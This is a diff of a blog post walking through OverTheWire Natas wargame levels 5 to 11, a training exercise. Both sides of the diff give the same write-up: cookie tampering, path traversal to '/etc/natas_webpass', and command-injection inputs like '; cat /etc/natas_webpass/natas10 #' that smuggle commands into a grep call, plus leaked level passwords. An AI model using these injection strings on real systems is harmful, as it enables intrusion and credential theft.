-<p>Looks like there&rsquo;s a parameter setting &rsquo;loggedin&rsquo; to 0. Changing this to 1 gives me the password to the next level.</p>
-<blockquote>
-<p>Access granted. The password for natas6 is
-aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p>
-</blockquote>
-<h2 id="level-6---7">Level 6 -&gt; 7</h2>
-<p>Viewing the source gives me a clue to check out &lsquo;inclues/secret.inc&rsquo;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;includes/secret.inc&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;submit&#34;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="s2">&#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="s2">&#34;Wrong secret&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>The &lsquo;includes/secret.inc&rsquo; file gives me a secret key, which when submitted gives me the next password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&#34;FOEIUWGHFEEUHOFUOIU&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><blockquote>
-<p>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p>
-</blockquote>
-<h2 id="level-7---8">Level 7 -&gt; 8</h2>
-<p>The page source shows:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?page=home&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?page=about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>There are also 2 links to a &lsquo;Home&rsquo; and &lsquo;About&rsquo; page which show more or less the same thing. I noticed the URL routed to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home" target="_blank" rel="noopener noreffer ">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and when typing in a non-existant route, I get the following error:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Warning: include<span class="o">(</span><span class="nb">test</span><span class="o">)</span>: failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line <span class="m">21</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Warning: include<span class="o">()</span>: Failed opening <span class="s1">&#39;test&#39;</span> <span class="k">for</span> inclusion <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">&#39;.:/usr/share/php:/usr/share/pear&#39;</span><span class="o">)</span> in /var/www/natas/natas7/index.php on line <span class="m">21</span>
-</span></span></code></pre></div><p>Turns out this page is vulnerable to a path traversal attack. Accessing <a href="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" target="_blank" rel="noopener noreffer ">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</a> reveals the next level&rsquo;s password.</p>
-<blockquote>
-<p>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p>
-</blockquote>
-<h2 id="level-8---9">Level 8 -&gt; 9</h2>
-<p>The source code shows:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$encodedSecret</span> <span class="o">=</span> <span class="s2">&#34;3d3d516343746d4d6d6c315669563362&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">encodeSecret</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)));</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;submit&#34;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">encodeSecret</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$encodedSecret</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s2">&#34;Access granted. The password for natas9 is &lt;censored&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s2">&#34;Wrong secret&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>All we have to do for this level is reverse the function <code>encodeSecret</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@kali:~# php -a
-</span></span><span class="line"><span class="cl">Interactive mode enabled
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">php &gt; <span class="nb">echo</span> base64_decode<span class="o">(</span>strrev<span class="o">(</span>hex2bin<span class="o">(</span><span class="s1">&#39;3d3d516343746d4d6d6c315669563362&#39;</span><span class="o">)))</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">oubWYf2kBq
-</span></span></code></pre></div><p>Submitting the secret gives us the next password.</p>
-<blockquote>
-<p>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</p>
-</blockquote>
-<h2 id="level-9---10">Level 9 -&gt; 10</h2>
-<p>Source:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;needle&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;needle&#34;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/pre&gt;
-</span></span></span></code></pre></div><p>I don&rsquo;t program in PHP so I looked up the <code>passthru</code> command:</p>
-<blockquote>
-<p>The passthru() function is similar to the exec() function in that it executes a command. This function should be used in place of exec() or system() when the output from the Unix command is binary data which needs to be passed directly back to the browser. A common use for this is to execute something like the pbmplus utilities that can output an image stream directly. By setting the Content-type to image/gif and then calling a pbmplus program to output a gif, you can create PHP scripts that output images directly.</p>
-</blockquote>
-<p>It looks to me I can pass commands in the form box and it&rsquo;ll replace <code>$key</code>. Since inputs aren&rsquo;t sanitised and the introductory natas challenge page states that all passwords are also stored in /etc/natas_webpass, I&rsquo;m able input the following command to print out the password for the next level:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="p">;</span> cat /etc/natas_webpass/natas10 <span class="c1">#</span>
-</span></span></code></pre></div><p>By doing this, <code>$key</code> is substituted in with my command, causing grep to end prematurely and commenting out &lsquo;dictionary.txt&rsquo; at the end.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">grep -i <span class="p">;</span> cat /etc/natas_webpass/natas10 <span class="c1"># dictionary.txt</span>
-</span></span></code></pre></div><blockquote>
-<p>Output:
-nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</p>
-</blockquote>
-<h2 id="level-10---11">Level 10 -&gt; 11</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;needle&#34;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;needle&#34;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="s2">&#34;Input contains an illegal character!&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/pre&gt;
-</span></span></span></code></pre></div><p>This time there&rsquo;s some sanitasion for my input. I&rsquo;m now unable to terminate my command using <code>;</code>. However, the same substituion issue exists where I can instead pass along a different command. <code>.</code> and <code>*</code> are permitted characters, so I&rsquo;m able to use grep&rsquo;s ability to do a wildcard search on a specific file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.* /etc/natas_webpass/natas11 <span class="c1">#</span>
-</span></span></code></pre></div><p>Substituted:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">grep -i .* /etc/natas_webpass/natas11 <span class="c1"># dictionary.txt</span>
-</span></span></code></pre></div><p>The form then returns the next level&rsquo;s password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.htaccess:AuthType Basic
-</span></span><span class="line"><span class="cl">.htaccess: AuthName <span class="s2">&#34;Authentication required&#34;</span>
-</span></span><span class="line"><span class="cl">.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
-</span></span><span class="line"><span class="cl">.htaccess: require valid-user
-</span></span><span class="line"><span class="cl">.htpasswd:natas10:<span class="nv">$1$XOXwo</span>/z0<span class="nv">$K</span>/6kBzbw4cQ5exEWpW5OV0
-</span></span><span class="line"><span class="cl">/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
-</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>Updated on 01-05-2018</span>
-            </div></div>
-        <div class="post-info-line">
-            <div class="post-info-md"></div>
-            <div class="post-info-share">
-                <span></span>
-            </div>
-        </div>
-    </div>
-
-    <div class="post-info-more">
-        <section class="post-tags"></section>
-        <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav"><a href="/posts/2017-12-26-overthewire-bandit/" class="prev" rel="prev" title="OverTheWire Bandit"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>OverTheWire Bandit</a>
-            <a href="/posts/2018-09-11-vmware-ssh-bug/" class="next" rel="next" title="VMWare SSH Bug">VMWare SSH Bug<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
-</div>
-</article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2015 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://bchoy.me" target="_blank">Brian Choy</a></span></div>
-        </div>
-    </footer></div>
-
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
-            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
-            gtag('config', 'G-F9RPBWE7GE', { 'anonymize_ip': true });
-        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-F9RPBWE7GE" async></script></body>
-</html>
+</code></pre><p>I decided to fire up Tamper Data again and poke around to see I can find something wrong with the cookie sent.</p><figure><a class=lightgallery href=/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png title=/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png data-thumbnail=/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png data-sub-html="<h2>Tamper Data Cookie Field</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png data-srcset="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png, /posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png 1.5x, /posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png 2x" data-sizes=auto alt=/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png width=1543 height=902></a><figcaption class=image-caption>Tamper Data Cookie Field</figcaption></figure><p>Looks like there&rsquo;s a parameter setting &rsquo;loggedin&rsquo; to 0. Changing this to 1 gives me the password to the next level.</p><blockquote><p>Access granted. The password for natas6 is
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p></blockquote><h2 id=level-6---7>Level 6 -> 7</h2><p>Viewing the source gives me a clue to check out &lsquo;inclues/secret.inc&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;includes/secret.inc&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s2>&#34;submit&#34;</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$secret</span> <span class=o>==</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>print</span> <span class=s2>&#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>print</span> <span class=s2>&#34;Wrong secret&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>The &lsquo;includes/secret.inc&rsquo; file gives me a secret key, which when submitted gives me the next password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
+</span></span><span class=line><span class=cl><span class=nv>$secret</span> <span class=o>=</span> <span class=s2>&#34;FOEIUWGHFEEUHOFUOIU&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><blockquote><p>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p></blockquote><h2 id=level-7---8>Level 7 -> 8</h2><p>The page source shows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;index.php?page=home&#34;</span><span class=p>&gt;</span>Home<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;index.php?page=about&#34;</span><span class=p>&gt;</span>About<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>There are also 2 links to a &lsquo;Home&rsquo; and &lsquo;About&rsquo; page which show more or less the same thing. I noticed the URL routed to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home" target=_blank rel="noopener noreffer">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and when typing in a non-existant route, I get the following error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Warning: include<span class=o>(</span><span class=nb>test</span><span class=o>)</span>: failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line <span class=m>21</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Warning: include<span class=o>()</span>: Failed opening <span class=s1>&#39;test&#39;</span> <span class=k>for</span> inclusion <span class=o>(</span><span class=nv>include_path</span><span class=o>=</span><span class=s1>&#39;.:/usr/share/php:/usr/share/pear&#39;</span><span class=o>)</span> in /var/www/natas/natas7/index.php on line <span class=m>21</span>
+</span></span></code></pre></div><p>Turns out this page is vulnerable to a path traversal attack. Accessing <a href="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" target=_blank rel="noopener noreffer">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</a> reveals the next level&rsquo;s password.</p><blockquote><p>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p></blockquote><h2 id=level-8---9>Level 8 -> 9</h2><p>The source code shows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$encodedSecret</span> <span class=o>=</span> <span class=s2>&#34;3d3d516343746d4d6d6c315669563362&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encodeSecret</span><span class=p>(</span><span class=nv>$secret</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>strrev</span><span class=p>(</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$secret</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s2>&#34;submit&#34;</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>encodeSecret</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=nv>$encodedSecret</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=s2>&#34;Access granted. The password for natas9 is &lt;censored&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=s2>&#34;Wrong secret&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>All we have to do for this level is reverse the function <code>encodeSecret</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@kali:~# php -a
+</span></span><span class=line><span class=cl>Interactive mode enabled
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>php &gt; <span class=nb>echo</span> base64_decode<span class=o>(</span>strrev<span class=o>(</span>hex2bin<span class=o>(</span><span class=s1>&#39;3d3d516343746d4d6d6c315669563362&#39;</span><span class=o>)))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>oubWYf2kBq
+</span></span></code></pre></div><p>Submitting the secret gives us the next password.</p><blockquote><p>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</p></blockquote><h2 id=level-9---10>Level 9 -> 10</h2><p>Source:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>pre</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span>
+</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s2>&#34;needle&#34;</span><span class=p>,</span> <span class=nv>$_REQUEST</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$key</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;needle&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$key</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>passthru</span><span class=p>(</span><span class=s2>&#34;grep -i </span><span class=si>$key</span><span class=s2> dictionary.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/pre&gt;
